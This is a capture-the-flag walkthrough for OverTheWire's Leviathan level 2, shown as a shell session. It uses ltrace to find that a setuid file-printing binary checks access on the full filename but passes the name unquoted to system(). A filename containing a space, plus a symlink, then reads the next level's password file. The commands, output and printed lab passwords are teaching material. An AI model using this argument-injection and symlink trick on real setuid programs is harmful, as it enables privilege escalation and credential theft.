# Leviathan2

## LEVEL GOAL

There is no information for this level, intentionally.

## SOLUTION

`nikhilh@ubuntu:~$ ssh -p 2223 leviathan2@leviathan.labs.overthewire.org`

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
leviathan2@leviathan.labs.overthewire.org's password: 
Linux leviathan 4.16.7 #2 SMP Thu May 10 14:46:45 CEST 2018 x86_64
...
...

`leviathan2@leviathan:~$ ls`

`printfile`

`leviathan2@leviathan:~$ ./printfile`

`*** File Printer ***`

`Usage: ./printfile filename`

`leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan2`

`/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied`

`leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3`

`You cant have that file...`

`leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2`

`__libc_start_main(0x565556c0, 2, 0xffffd714, 0x565557b0 <unfinished ...>`

`access("/etc/leviathan_pass/leviathan2", 4)                                                                                   = 0`

`snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2")                         = 39`

`geteuid()                                                                                                                     = 12002`

`geteuid()                                                                                                                     = 12002`

`setreuid(12002, 12002)                                                                                                        = 0`

`system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta`

` <no return ...>`

`--- SIGCHLD (Child exited) ---`

`<... system resumed> )                                                                                                        = 0`

`+++ exited (status 0) +++`

`leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3`

`__libc_start_main(0x565556c0, 2, 0xffffd714, 0x565557b0 <unfinished ...>`

`access("/etc/leviathan_pass/leviathan3", 4)                                                                                   = -1`

`puts("You cant have that file..."You cant have that file...`

`)                                                                                            = 27`

`+++ exited (status 1) +++`

`leviathan2@leviathan:~$ cd /tmp`

`leviathan2@leviathan:/tmp$ mkdir levi2`

`leviathan2@leviathan:/tmp$ cd levi2`

`leviathan2@leviathan:/tmp/levi2$ touch file\ name`

`leviathan2@leviathan:/tmp/levi2$ ls`

`file name`

`leviathan2@leviathan:/tmp/levi2$ ltrace /home/leviathan2/printfile file\ name`

`__libc_start_main(0x565556c0, 2, 0xffffd704, 0x565557b0 <unfinished ...>`

`access("file name", 4)                                                                                                        = 0`

`snprintf("/bin/cat file name", 511, "/bin/cat %s", "file name")                                                               = 18`

`geteuid()                                                                                                                     = 12002`

`geteuid()                                                                                                                     = 12002`

`setreuid(12002, 12002)                                                                                                        = 0`

`system("/bin/cat file name"/bin/cat: file: No such file or directory`

`/bin/cat: name: No such file or directory`

` <no return ...>`

`--- SIGCHLD (Child exited) ---`

`<... system resumed> )                                                                                                        = 256`

`+++ exited (status 0) +++`

`leviathan2@leviathan:/tmp/levi2$ ln -s /etc/leviathan_pass/leviathan3 name`

`leviathan2@leviathan:/tmp/levi2$ ls`

`file name  name`

`leviathan2@leviathan:/tmp/levi2$ /home/leviathan2/printfile file\ name`

`/bin/cat: file: No such file or directory`

`Ahdiemoo1j`
